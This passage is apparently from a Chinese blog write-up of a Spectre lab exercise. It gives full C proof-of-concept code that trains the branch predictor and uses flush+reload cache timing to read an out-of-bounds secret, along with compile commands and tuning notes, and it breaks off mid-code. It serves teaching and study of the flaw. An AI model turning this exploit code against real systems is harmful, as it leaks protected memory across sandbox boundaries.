+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreExperiment SpectreExperiment.c<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.12.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>2、注释<code>_mm_clflush(&amp;size);</code>。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.13.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>再次编译运行，多次运行后仍然无法得到Secret值，因为注释掉该代码后，所取到的值都不会被CPU缓存，所以无法得到Secret值。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.14.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>3、取消注释，并修改<code>victim(i)</code>为<code>victim(i+20)</code></p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.15.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>再次编译运行，结果也是无法获取Secret值，因为此时victim函数的条件分支不会再执行，也就无法训练CPU。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.16.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="Task-4-The-Spectre-Attack">Task 4: The Spectre Attack</h2>
+<p>task4实现的是在同一个进程中获取数据。编译运行结果如下，需要运行几次程序之后才能成功。</p>
+<ul>
+<li>利用分支预测可以获取秘密值，秘密值可能是不同进程的数据，那是用硬件隔离机制来保护的。如果是同一个进程的数据， 往往利用软件的沙盒机制。获取不同进程的数据难度高很多，这里是演示在同一个进程中获取数据。</li>
+<li>浏览器中不同页面是用不同沙盒隔离开的，幽灵漏洞可以获取另一个页面的数据。</li>
+</ul>
+<p><strong>攻击</strong></p>
+<p>当在浏览器中打开来自不同服务器的网页时，它们通常在同一过程中打开。在浏览器内实现的沙箱将为这些页面提供一个孤立的环境，因此其中一个页面将无法访问另一个页面的数据。大多数软件保护都依赖于条件检查来决定是否应该授予访问权限。通过Spectre攻击，我们可以让cpu执行（无序地）一个受保护的代码分支，即使条件检查失败，本质上击败了访问检查。</p>
+<p><strong>实验设置</strong></p>
+<p>在这个设置中，有两种类型的区域：限制区域和非限制区域。该限制是通过在下面描述的沙箱函数中实现的如果条件来实现的。沙箱函数仅当x位于缓冲区的下限和上限之间时，才为用户提供的x值返回缓冲区[x]的值。因此，此沙箱函数永远不会向用户返回限制区域内的任何内容。Experiment setup: the buffer and the protected secret：</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.7.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>在限制区域中有一个秘密值（在缓冲区上方或下方），攻击者知道该秘密的地址，但攻击者不能直接访问持有该秘密值的内存。访问这个秘密的唯一方法是通过上面的沙箱功能。尽管如果x大于缓冲区大小，则永远不会执行true分支，但在微架构级别上，可以执行它，并且在恢复执行时可以留下一些痕迹。</p>
+<p><code>SpectreAttack.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">char</span>    *secret    = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> junk=<span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">for</span>(i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;array[%d*4096 + %d] is in cache.\n&quot;</span>, i, DELTA);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The Secret = %d(%c).\n&quot;</span>,i, i);<br>    &#125;<br>  &#125; <br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index_beyond)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br>  <span class="hljs-comment">// Train the CPU to take the true branch inside restrictedAccess().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123; <br>      restrictedAccess(i); <br>  &#125;<br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower);<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;   &#125;<br>  <span class="hljs-comment">// Ask restrictedAccess() to return the secret in out-of-order execution. </span><br>  s = restrictedAccess(index_beyond);  <br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;  <br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  flushSideChannel();<br>  <span class="hljs-type">size_t</span> index_beyond = (<span class="hljs-type">size_t</span>)(secret - (<span class="hljs-type">char</span>*)buffer);  <span class="hljs-comment">// ④</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;secret: %p \n&quot;</span>, secret);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;buffer: %p \n&quot;</span>, buffer);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;index of secret (out of bound): %ld \n&quot;</span>, index_beyond);<br>  spectreAttack(index_beyond);<br>  reloadSideChannel();<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>Line➃从缓冲区开始就计算这个秘密的偏移量（我们假设攻击者知道这个秘密的地址；在真正的攻击中，攻击者有很多方法可以找出地址，包括猜测）。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreAttack SpectreAttack.c<br></code></pre></td></tr></table></figure>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.17.jpg" srcset="/img/loading.gif" lazyload class="">
+<h2 id="Task-5-Improve-the-Attack-Accuracy">Task 5: Improve the Attack Accuracy</h2>
+<p><code>SpectreAttackImproved.c</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_lower = <span class="hljs-number">0</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> bound_upper = <span class="hljs-number">9</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">uint8_t</span> temp    = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span>    *secret = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt;= bound_upper &amp;&amp; x &gt;= bound_lower) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> scores[<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannelImproved</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-type">int</span> junk = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i * <span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)<br>      scores[i]++; <span class="hljs-comment">/* if cache hit, add 1 for this value */</span><br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">spectreAttack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> index_beyond)</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">int</span> z;<br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br><br>  <span class="hljs-comment">// Train the CPU to take the true branch inside victim().</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>    restrictedAccess(i);  <br>  &#125;<br><br>  <span class="hljs-comment">// Flush bound_upper, bound_lower, and array[] from the cache.</span><br>  _mm_clflush(&amp;bound_upper);<br>  _mm_clflush(&amp;bound_lower); <br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)  &#123; _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA]); &#125;<br>  <span class="hljs-keyword">for</span> (z = <span class="hljs-number">0</span>; z &lt; <span class="hljs-number">100</span>; z++)  &#123;  &#125;<br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Ask victim() to return the secret in out-of-order execution.</span><br>  s = restrictedAccess(index_beyond);<br>  <span class="hljs-built_in">array</span>[s*<span class="hljs-number">4096</span> + DELTA] += <span class="hljs-number">88</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-type">uint8_t</span> s;<br>  <span class="hljs-type">size_t</span> index_beyond = (<span class="hljs-type">size_t</span>)(secret - (<span class="hljs-type">char</span>*)buffer);<br><br>  flushSideChannel();<br>  <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">256</span>; i++) scores[i]=<span class="hljs-number">0</span>; <br><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;*****\n&quot;</span>);  <span class="hljs-comment">// This seemly &quot;useless&quot; line is necessary for the attack to succeed</span><br>    spectreAttack(index_beyond);<br>    usleep(<span class="hljs-number">100</span>);<br>    reloadSideChannelImproved();<br>  &#125;<br><br>  <span class="hljs-type">int</span> max = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++)&#123;<br>    <span class="hljs-keyword">if</span>(scores[max] &lt; scores[i]) max = i;<br>  &#125;<br><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Reading secret value at index %ld\n&quot;</span>, index_beyond);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The secret value is %d(%c)\n&quot;</span>, max, max);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;The number of hits is %d\n&quot;</span>, scores[max]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-number">0</span>); <br>&#125;<br></code></pre></td></tr></table></figure>
+<p>1、编译运行SpectreAttackImproved.c，此时<code>usleep(10)</code>睡眠10s，攻击并不能一次成功。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">gcc <span class="hljs-attribute">-march</span>=native -o SpectreAttackImproved SpectreAttackImproved.c<br></code></pre></td></tr></table></figure>
+<p>第一次运行不成功：</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.18.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>第二次运行成功：</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.19.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>2、修改<code>usleep(10)</code>为<code>usleep(100)</code>，增加睡眠时间，即增加预测时间，第一次运行程序便可以成功拿到Secret值。</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.20.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>第一次运行就成功：</p>
+<img src="/2024/02/20/Lab12_%E5%B9%BD%E7%81%B5%E6%94%BB%E5%87%BB/12.21.jpg" srcset="/img/loading.gif" lazyload class="">
+<p>应该是由于usleep的时间不够，预测执行时间不够，array[s*4096 + DELTA] += 88;没能执行，容易导致最大score为scores[0]，只要增加时间为100微秒问题就可解决。</p>
+<h2 id="Task-6-Steal-the-Entire-Secret-String">Task 6: Steal the Entire Secret String</h2>
+<p>1、对SpectreAttackImproved.c进行修改，获取所有字符。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;emmintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;x86intrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> buffer_size = <span class="hljs-number">10</span>;<br><span class="hljs-type">uint8_t</span> buffer[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;; <br><span class="hljs-type">uint8_t</span> temp = <span class="hljs-number">0</span>;<br><span class="hljs-type">char</span> *secret = <span class="hljs-string">&quot;Some Secret Value&quot;</span>;   <br><span class="hljs-type">uint8_t</span> <span class="hljs-built_in">array</span>[<span class="hljs-number">256</span>*<span class="hljs-number">4096</span>];<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CACHE_HIT_THRESHOLD (80)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DELTA 1024</span><br><br><span class="hljs-comment">// Sandbox Function</span><br><span class="hljs-type">uint8_t</span> <span class="hljs-title function_">restrictedAccess</span><span class="hljs-params">(<span class="hljs-type">size_t</span> x)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> (x &lt; buffer_size) &#123;<br>     <span class="hljs-keyword">return</span> buffer[x];<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125; <br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">flushSideChannel</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">int</span> i;<br>  <span class="hljs-comment">// Write to array to bring it to RAM to prevent Copy-on-write</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) <span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> + DELTA] = <span class="hljs-number">1</span>;<br>  <span class="hljs-comment">//flush the values of the array from cache</span><br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) _mm_clflush(&amp;<span class="hljs-built_in">array</span>[i*<span class="hljs-number">4096</span> +DELTA]);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> scores[<span class="hljs-number">256</span>];<br><span class="hljs-type">void</span> <span class="hljs-title function_">reloadSideChannelImproved</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-type">int</span> i;<br>  <span class="hljs-keyword">volatile</span> <span class="hljs-type">uint8_t</span> *addr;<br>  <span class="hljs-keyword">register</span> <span class="hljs-type">uint64_t</span> time1, time2;<br>  <span class="hljs-type">int</span> junk = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">256</span>; i++) &#123;<br>    addr = &amp;<span class="hljs-built_in">array</span>[i * <span class="hljs-number">4096</span> + DELTA];<br>    time1 = __rdtscp(&amp;junk);<br>    junk = *addr;<br>    time2 = __rdtscp(&amp;junk) - time1;<br>    <span class="hljs-keyword">if</span> (time2 &lt;= CACHE_HIT_THRESHOLD)<br>      scores[i]++; <span class="hljs-comment">/* if cache hit, add 1 for this value 